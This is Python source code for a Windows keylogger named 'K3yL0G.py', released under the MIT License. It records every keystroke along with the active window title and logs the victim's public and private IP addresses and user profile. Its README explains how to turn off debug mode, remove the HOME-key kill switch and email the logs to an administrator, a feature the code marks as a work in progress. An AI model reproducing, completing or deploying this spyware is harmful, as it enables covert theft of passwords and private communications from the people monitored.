from pynput.keyboard import Key, Listener
import win32gui
import random
import requests
import socket
import time
import os
import sender
import threading
"""
MIT License

Copyright (c) 2023 MazZ

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""
'''
TODO: 
Finish send_logs(): Sends logs to specified email instead of storing on disk. GMAIL API was being a bitch...
'''
'''=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-K3yL0G.py README-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
# K3yL0G.py records user application activity, and the user's keystrokes corresponding to that application.
# This program will record sensitive data such as passwords, emails, phone numbers. EVERYTHING that the user
types is stored in the logs.txt file, or emailed to the administer of 'K3yL0G.py'.
# K3yL0G.py is initially setup to run in 'DEBUG' mode. Which outputs the keys pressed, to a console, and stores the data
to a 'Logs.txt' file in the specified debug DIR on disk, rather than emailing the administer of this file. This is to help minimize 
damage from script kiddies. While in Debug Mode 'K3yL0G.py' can be shut down with 'HOME' key.
# I assume whoever is running this script possesses the knowledge to take it out of debug mode;
If you are interested. Here is a quick run down on how that would work:
    # Under the write_file() function; Change dirList = [debug] >> dirList  = [one, two, three] 
    # Change the TO:/FROM: email vars to your own email. (Must be setup with google API) # Current WIP
    # Run send_logs() function >> __name__ == '__main__'  (Above the Listener) # Current WIP
    # OPTIONAL: Remove/modify the if statement under on_press() function that shuts down K3yL0G.py with 'HOME' key.
    #### REMEMBER: To shutdown you will need to end the task in the Task Manager. ####
'''

# Log Banner Info
pubIP = requests.get('https://api.ipify.org').text  # Grabs Public IP from ipify API
privIP = socket.gethostbyname(socket.gethostname())  # Grabs Private Network Address
user = os.path.expanduser('~').split('\\')[2]  # Grabs user path
datetime = time.ctime(time.time())  # Current Date/Time

# Banner
msg = f"[START OF LOGS]\n ~* Date/Time: {datetime}\n ~* User-Profile: {user}\n ~* Public IP: {pubIP}\n " \
      f"~* Private IP: {privIP}\n"

'''
LOGGED DATA
'''
# Logged Info
log_data = [msg]

# Application Info
oldApp = ''
d_file = []

# Writes to file every _ keys pressed.
key_count = 0
keys = []


# Defines What to do/listen for on each key press
def on_press(key):
    global oldApp, key_count

    # Grabs Name from window of Active Application that the user is using.
    app = win32gui.GetWindowText(win32gui.GetForegroundWindow())

    # Cortana == Win start menu
    if app == 'Cortana':
        app = 'Windows Start Menu'
    else:
        pass

    # Logs Application Info.
    if app != oldApp and app != '':
        log_data.append(f"\n\n[{datetime}] ~ {app}\n")
        oldApp = app
    else:
        pass

    # List of keys to substitute
    sub_list = ['Key.enter', '[ENTER]\n', 'Key.backspace', '[BACKSPACE]', 'Key.space', ' ',
                'Key.alt_l', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]',
                'Key.left', '[LEFT ARROW]', 'Key.right', '[RIGHT ARROW]', 'Key.shift', '', '\\x13',
                '[CTRL-S]', '\\x17', '[CTRL-W]', 'Key.caps_lock', '[CAPS LK]', '\\x01', '[CTRL-A]', 'Key.cmd',
                '[WINDOWS KEY]', 'Key.print_screen', '[PRNT SCR]', '\\x03', '[CTRL-C]', '\\x16', '[CTRL-V]']

    # Cleans output of key and counts keystrokes.
    key = str(key).strip('\'')
    key_count += 1
    print(key)  # For debugging only

    # Sub_list Example: 'Key.enter' == [ENTER]\n
    if key in sub_list:
        log_data.append(sub_list[sub_list.index(key) + 1])
    else:
        log_data.append(key)

    # Ensures that every keystroke is written to the logs.txt - DEBUG MODE ONLY!
    if key_count > 1:
        key_count = 0
        write_file()


# Function that Writes Key Logs to file(s)
def write_file():
    # Directories to save log file(s)
    # one = os.path.expanduser('~') + '/Documents/'
    # two = os.path.expanduser('~') + '/Pictures/'
    # three = os.path.expanduser('~') + '/******/' - Add another DIR
    debug = os.path.expanduser('~') + '/Documents/GitHub/Python/Random Projects/keyloggers/'  # Change this

    # List of directories to move temp stored log file between. (Only use when emailing logs)
    dirList = [debug]

    # Changes directories/filename of the log each time it is written. (Turned off until email is working.)
    filepath = random.choice(dirList)
    filename = 'Logs.txt'  # str(count) + 'I' + str(random.randint(100000, 999999)) + '.txt' -For when send_file() works
    file = filepath + filename
    d_file.append(file)

    # Writes Data to logs
    with open(file, 'w', encoding='utf-8') as fp:
        for key in log_data:
            k = str(key).replace("'", "")
            #  Comment out "Key.space, ' '," in sublist for every word typed to be on a new line.
            if k.find("space") > 0:
                fp.write("\n")
            elif k.find("Key") == -1:
                fp.write(k)
        # fp.write(''.join(log_data))
    # print('Data Written to Logs.txt...') # Debugging


# Shutdown Key == [HOME] - DEBUG ONLY!
def on_release(key):
    if key == Key.home:
        return False


# CURRENT WIP - Will send log file to specified email, instead of storing on disk. Google API is currently being a bitch
def send_logs():
    count = 0
    MIN = 10
    SECS = 60
    # time.sleep(MIN * SECONDS) # Sends email every 10min  # Ever 30s for debugging
    time.sleep(5)
    while True:
        if len(log_data) > 1:
            try:
                write_file()
                sender.send_file(d_file[0])
                time.sleep(5)
                os.remove(d_file[0])
                del log_data[1:]
                del d_file[0:]
                print('Deleted data/files')  # DEBUG MODE ONLY

                count += 1
                break

            except Exception as errorString:
                print('[!] logs // Error.. ~ %s' % errorString)
                break


# Start Listener
if __name__ == '__main__':
    #T1 = threading.Thread(target=send_logs)
    #T1.start()

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
